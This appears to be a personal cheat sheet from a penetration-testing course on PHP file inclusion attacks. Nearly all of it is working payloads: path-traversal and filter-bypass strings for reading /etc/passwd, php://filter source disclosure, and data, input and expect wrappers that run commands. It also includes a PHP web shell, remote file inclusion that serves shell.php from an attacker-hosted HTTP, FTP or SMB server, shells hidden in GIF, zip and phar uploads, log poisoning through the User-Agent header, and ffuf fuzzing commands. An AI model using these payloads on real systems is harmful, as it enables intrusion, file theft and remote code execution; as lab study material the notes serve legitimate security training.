*********File Disclosure - LFI (Local File Inclusion)***
The most common place we usually find LFI within is templating engines. (header, navigation bar, and footer)
This is why we often see a parameter like /index.php?page=about, where index.php sets static content (e.g. header/footer), and then only pulls the dynamic content specified in the parameter, which in this case may be read from a file called about.php.
Each of them has a slightly different approach to including local files, but they all share one common thing: loading a file from a specified path.
 Basic LFI 	
 /index.php?language=/etc/passwd 	Basic LFI
 /index.php?language=../../../../etc/passwd 	LFI with path traversal
 /index.php?language=/../../../etc/passwd 	LFI with name prefix
 /index.php?language=./languages/../../../../etc/passwd 	LFI with approved path

C:\Windows\boot.ini
/var/www/html/ we are 3 directories away from the root path

File Disclosure - LFI bypass ***
One of the most basic filters against LFI is a search and replace filter, where it simply deletes substrings of (../) to avoid path traversals.
....//....//....//....//etc/passwd
or encoded:
....//....//....//....//etc/passwd => %2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%65%74%63%2f%70%61%73%73%77%64

double encoded = %25%32%65%25%32%65%25%32%65%25%32%65%25%32%66%25%32%66%25%32%65%25%32%65%25%32%65%25%32%65%25%32%66%25%32%66%25%32%65%25%32%65%25%32%65%25%32%65%25%32%66%25%32%66%25%32%65%25%32%65%25%32%65%25%32%65%25%32%66%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34

/..././..././..././..././etc/passwd

 /index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times] 	Bypass appended extension with path truncation (obsolete)
 /index.php?language=../../../../etc/passwd%00 			Bypass appended extension with null byte (obsolete)
 /index.php?language=php://filter/read=convert.base64-encode/resource=config		Read PHP with base64 filter

 echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done

 File Disclosure - PHP Filters ***
 Source Code Disclosure:
 https://www.php.net/manual/en/wrappers.php.php
 http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config

Fuzzing php files:
 ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
 http://<SERVER_IP>:<PORT>/index.php?language=config
 http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=configure

 Remote Code Execution - PHP Wrappers ***

 -Data Wrappers:
 https://www.php.net/manual/en/wrappers.data.php
 1.curl "http://94.237.62.195:43859/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
 2.echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include.  ==> allow_url_include = On
 Excellent! We see that we have this option enabled, so we can use the data wrapper
 With allow_url_include enabled, we can proceed with our data wrapper attack.
 3.echo '<?php system($_GET["cmd"]); ?>' | base64 =>PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
 4.http://http://94.237.62.195:43859/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
 curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid

 -Input wrapper:
 https://www.php.net/manual/en/wrappers.php.php
 the input wrapper also depends on the allow_url_include setting, as mentioned earlier.
 curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid

 -Expect wrapper: 
 https://www.php.net/manual/en/wrappers.expect.php
 echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
 curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"

***************Remote File Inclusion (RFI) ****************

any remote URL inclusion in PHP would require the allow_url_include setting to be enabled
1.curl "http://94.237.62.195:43859/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
2.echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
3.Checking = http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php

4. Create
echo '<?php system($_GET["cmd"]); ?>' > shell.php
sudo python3 -m http.server <LISTENING_PORT>

5. http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id

FTP
sudo python -m pyftpdlib -p 21
http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id is the same as :
curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'

SMB
-If the vulnerable web application is hosted on a Windows server. This technique is more likely to work if we were on the same network, as accessing remote SMB servers over the internet may be disabled by default.
-do not need the allow_url_include setting to be enabled for RFI exploitation, as we can utilize the SMB protocol for the remote file inclusion.
-This is because Windows treats files on remote SMB servers as normal files, which can be referenced directly with a UNC path.
1.We can spin up an SMB server using Impacket's smbserver.py, which allows anonymous authentication by default:
impacket-smbserver -smb2support share $(pwd)

LFI and File Uploads------
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id

Zip Upload----
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
ZIP wrapper - https://www.php.net/manual/en/wrappers.compression.php
http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
2.http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami

Phar Upload
1.shell.php:
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();

2.php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
3. http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
4. https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-phpinfo

Log Poisoning---------------------------
take PHPSESSID
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
Inject: 
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
and then:
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id

Server Log Poisoning*
Both Apache and Nginx maintain various log files, such as access.log and error.log.
The access.log file contains various information about all requests made to the server, including each request's User-Agent header. As we can control the User-Agent header in our requests, we can use it to poison the server logs as we did above.
Apache logs are located in /var/log/apache2/
Nginx logs are located in /var/log/nginx/ 

LFI Wordlist testing - https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI

http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log
Since User-Agent is visible in logs, we can modify and inject payload
User-Agent: <?php system($_GET['cmd']); ?>
curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"

We can try to get info from:
/proc/self/environ
/proc/self/fd/N
/var/log/sshd.log
/var/log/mail
/var/log/vsftpd.log

---Automated Scanning-----------------------
The most popular LFI parameters:
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}

Wordlist for Linux: 
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt
Wordlist for Windows:
c:\inetpub\wwwroot\
c:\xampp\htdocs\
c:\wamp\www

ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf
curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/envvars

Tools:
LFISUite - https://github.com/D35m0nd142/LFISuite
LFIFreak - https://github.com/OsandaMalith/LFiFreak
Liffy - https://github.com/mzfr/liffy

 

